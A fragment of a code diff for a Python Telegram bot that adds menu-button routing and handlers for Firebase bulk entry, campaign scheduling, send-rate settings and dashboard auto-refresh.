     if data == "fb_add": return await firebase_add_start(update, context)
+    if data == "fb_bulk": return await firebase_bulk_start(update, context)
     if data.startswith("fb_view_"):
         return await firebase_view(update, context, int(data[8:]))
     if data.startswith("fb_test_"):
@@ -2059,6 +2509,9 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "camp_change_data": return await campaign_change_data(update, context)
     if data == "camp_cancel": return await campaign_cancel(update, context)
     if data == "camp_confirm": return await campaign_confirm_start(update, context)
+    if data == "camp_schedule": return await campaign_schedule_ask(update, context)
+    if data.startswith("camp_unschedule_"):
+        return await campaign_unschedule(update, context, data[16:])
     if data == "camp_recheck": return await campaign_recheck_devices(update, context)
     if data.startswith("camp_file_"):
         return await campaign_select_file(update, context, int(data[10:]))
@@ -2096,9 +2549,12 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await settings_set_delay(update, context, float(data[10:]))
     if data.startswith("set_sim_"):
         return await settings_set_sim(update, context, int(data[8:]))
+    if data.startswith("set_rate_"):
+        return await settings_set_rate(update, context, int(data[9:]))
 
     # -- Dashboard --
     if data == "dash_refresh": return await show_dashboard(update, context)
+    if data == "dash_autoon": return await dashboard_auto_refresh(update, context)
     if data == "new_campaign": return await campaign_start(update, context)
 
 
@@ -2113,6 +2569,24 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     state = context.user_data.get('state', ST_IDLE)
 
+    # ── Persistent bottom-menu buttons (take priority over idle text) ──
+    text_in = (update.message.text or "").strip()
+    BOTTOM_MENU = {
+        BTN_SEND: campaign_start,
+        BTN_UPLOAD: data_upload_start,
+        BTN_TEMPLATES: show_templates,
+        BTN_FIREBASE: show_firebase,
+        BTN_DEVICES: show_devices,
+        BTN_STATUS: show_dashboard,
+        BTN_HISTORY: show_history,
+        BTN_SETTINGS: show_settings,
+        BTN_USAGE: show_daily_usage,
+        BTN_HELP: show_help,
+    }
+    if text_in in BOTTOM_MENU:
+        clear_state(context)
+        return await BOTTOM_MENU[text_in](update, context)
+
     if state == ST_TPL_NAME:
         return await handle_template_name(update, context)
     if state == ST_TPL_MSG:
@@ -2121,6 +2595,10 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await handle_template_edit_msg(update, context)
     if state == ST_FB_URL:
         return await handle_firebase_url(update, context)
+    if state == ST_FB_BULK:
+        return await handle_firebase_bulk(update, context)
+    if state == ST_SCHED_TIME:
+        return await handle_schedule_time(update, context)
 
     await update.message.reply_text("Use /start to open the main menu.")
 
